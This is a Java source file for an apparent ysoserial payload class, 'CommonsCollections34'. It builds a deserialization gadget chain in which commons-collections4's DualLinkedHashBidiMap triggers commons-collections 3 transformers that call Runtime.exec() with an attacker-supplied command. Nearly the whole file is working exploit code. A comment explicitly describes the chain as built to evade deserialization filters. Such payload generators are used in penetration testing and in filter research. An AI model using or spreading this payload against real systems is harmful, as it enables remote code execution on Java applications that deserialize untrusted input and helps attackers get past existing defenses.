package ysoserial.payloads;

import java.io.Serializable;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections4.bidimap.DualLinkedHashBidiMap;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	DualLinkedHashBidiMap (CC4) entry point — cross-library chain.

	DualLinkedHashBidiMap is the commons-collections4 variant of DualHashBidiMap.
	CC18 uses CC3's DualHashBidiMap; this uses CC4's DualLinkedHashBidiMap with
	CC3's TiedMapEntry/LazyMap/ChainedTransformer tail. Cross-library chain
	(CC4 entry + CC3 gadgets) maximizes filter evasion.

	DualLinkedHashBidiMap maintains insertion order via LinkedHashMap internals.
	Its readObject reconstructs the internal maps and calls put() for each
	stored entry, triggering key.hashCode().

	Gadget chain:
		ObjectInputStream.readObject()
			DualLinkedHashBidiMap.readObject()      // CC4 class
				AbstractDualBidiMap.putAll() → put()
					LinkedHashMap.put(key, value)
						key.hashCode()
							TiedMapEntry.hashCode()           // CC3 class
								TiedMapEntry.getValue()
									LazyMap.get()             // CC3 class
										ChainedTransformer.transform()
											InvokerTransformer.transform()
												Method.invoke()
													Runtime.exec()

	Filter evasion:
		1. DualLinkedHashBidiMap (o.a.c.collections4.bidimap) — not in any filter
		2. Cross-library: entry from CC4, tail from CC3
		3. Different package namespace from CC18 (collections4 vs collections)
		4. Filters targeting DualHashBidiMap miss DualLinkedHashBidiMap

	Most productive novel root in 9-hour fuzzing session: 182 findings.

	Requires:
		commons-collections 3.1+ AND commons-collections4 4.0+
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1", "org.apache.commons:commons-collections4:4.0"})
@Authors({ Authors.DMBS335 })
public class CommonsCollections34 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String command) throws Exception {

		final String[] execArgs = new String[] { command };

		// Inert transformer during setup
		final Transformer[] fakeTransformers = new Transformer[] {
			new ConstantTransformer(1) };
		final ChainedTransformer transformerChain = new ChainedTransformer(fakeTransformers);

		// Real transformers to arm later
		final Transformer[] realTransformers = new Transformer[] {
			new ConstantTransformer(Runtime.class),
			new InvokerTransformer("getMethod", new Class[] {
				String.class, Class[].class }, new Object[] {
				"getRuntime", new Class[0] }),
			new InvokerTransformer("invoke", new Class[] {
				Object.class, Object[].class }, new Object[] {
				null, new Object[0] }),
			new InvokerTransformer("exec",
				new Class[] { String.class }, execArgs),
			new ConstantTransformer(1) };

		final Map innerMap = new HashMap();
		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		// DualLinkedHashBidiMap (CC4) as entry gadget
		DualLinkedHashBidiMap bidi = new DualLinkedHashBidiMap();
		bidi.put(entry, "bar");

		// Remove cached entry
		innerMap.remove("foo");

		// Arm
		Reflections.setFieldValue(transformerChain, "iTransformers", realTransformers);

		return bidi;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections34.class, args);
	}
}
